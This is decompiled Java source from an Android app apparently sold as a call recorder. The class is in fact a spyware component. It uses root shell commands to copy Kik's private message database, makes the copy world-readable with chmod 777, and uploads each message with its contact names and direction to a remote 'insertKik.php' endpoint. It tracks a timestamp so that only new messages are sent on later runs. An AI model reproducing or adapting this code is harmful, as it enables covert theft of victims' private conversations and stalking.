package com.yasoka.spcallrecord.recorder.call.a.c.d;

import a.c.e.e;
import a.c.f.a;
import a.c.j.c;
import android.content.Context;
import android.database.Cursor;
import com.crashlytics.android.Crashlytics;
import java.io.DataOutputStream;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;

/* compiled from: GetDataKIK */
public class f extends h implements Runnable {

    /* renamed from: b reason: collision with root package name */
    public static boolean f165b;

    /* renamed from: a reason: collision with root package name */
    private final Context f166a;

    public f(Context context) {
        this.f166a = context;
    }

    private void a(Context context, String str, long j) throws Exception {
        Context context2 = context;
        String str2 = "display_name";
        SimpleDateFormat d2 = c.d();
        a aVar = new a(context2, a.c.e.c.a(), str);
        aVar.b();
        long j2 = j;
        Cursor f = aVar.f("messagesTable", j2);
        if (f == null) {
            return;
        }
        if (f.getCount() <= 0) {
            a(aVar, f);
            return;
        }
        String str3 = "";
        long j3 = j2;
        while (f.moveToNext()) {
            try {
                long j4 = f.getLong(f.getColumnIndexOrThrow("timestamp"));
                Date date = new Date();
                date.setTime(j4);
                Date date2 = new Date();
                date2.setTime(e.r(context));
                Calendar instance = Calendar.getInstance();
                instance.setTime(date2);
                instance.add(13, 1);
                if (date.compareTo(instance.getTime()) > 0) {
                    String string = f.getString(f.getColumnIndexOrThrow("body"));
                    String string2 = f.getString(f.getColumnIndexOrThrow("partner_jid"));
                    String string3 = f.getString(f.getColumnIndexOrThrow("was_me"));
                    if (string2 != null) {
                        Cursor a2 = aVar.a("KIKcontactsTable", "jid", string2);
                        if (a2.getCount() > 0) {
                            while (a2.moveToNext()) {
                                if (!str3.contains(a2.getString(a2.getColumnIndexOrThrow(str2)))) {
                                    StringBuilder sb = new StringBuilder();
                                    sb.append(str3);
                                    sb.append(a2.getString(a2.getColumnIndexOrThrow(str2)));
                                    sb.append("<br/>");
                                    str3 = sb.toString();
                                }
                            }
                        }
                    }
                    String str4 = str3;
                    if (string3 == null || !string3.equals("0")) {
                        a(context, str4, string, "2", d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertKik.php");
                    } else {
                        a(context, str4, string, "1", d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertKik.php");
                    }
                    j3 = date.getTime();
                    str3 = str4;
                }
            } catch (Exception e2) {
                e2.getStackTrace();
                try {
                    e2.getStackTrace();
                    Crashlytics.logException(e2);
                } catch (Exception unused) {
                }
            }
        }
        if (j3 != 0) {
            a.b.a.a.a.a(context2.getSharedPreferences("user", 0), "timekik", j3);
        }
        a(aVar, f);
    }

    public void run() {
        String str = "kik.db";
        try {
            Thread.sleep(5000);
        } catch (InterruptedException e2) {
            e2.printStackTrace();
        }
        if (f165b) {
            a(this.f166a);
            return;
        }
        f165b = true;
        try {
            if (e.r(this.f166a) == 0) {
                a.c.e.c.g(this.f166a);
            }
            if (e.r(this.f166a) != 0) {
                long r = e.r(this.f166a);
                DataOutputStream dataOutputStream = new DataOutputStream(Runtime.getRuntime().exec("su").getOutputStream());
                StringBuilder sb = new StringBuilder();
                sb.append("cat ");
                sb.append("/data/data/kik.android/databases/");
                sb.append("*.");
                sb.append("kikDatabase.db");
                sb.append(" > ");
                sb.append(a.c.e.c.a());
                sb.append(str);
                sb.append(" \n");
                dataOutputStream.writeBytes(sb.toString());
                StringBuilder sb2 = new StringBuilder();
                sb2.append("chmod 777 ");
                sb2.append(a.c.e.c.a());
                sb2.append("* \n");
                dataOutputStream.writeBytes(sb2.toString());
                StringBuilder sb3 = new StringBuilder();
                sb3.append("chmod -R 777 ");
                sb3.append(a.c.e.c.a());
                sb3.append("\n");
                dataOutputStream.writeBytes(sb3.toString());
                dataOutputStream.flush();
                dataOutputStream.writeBytes("exit\n");
                dataOutputStream.flush();
                Thread.sleep(10000);
                a(this.f166a, str, r);
            }
        } catch (Exception e3) {
            try {
                e3.getStackTrace();
                Crashlytics.logException(e3);
            } catch (Exception unused) {
            }
        }
        f165b = false;
        a(this.f166a);
    }
}
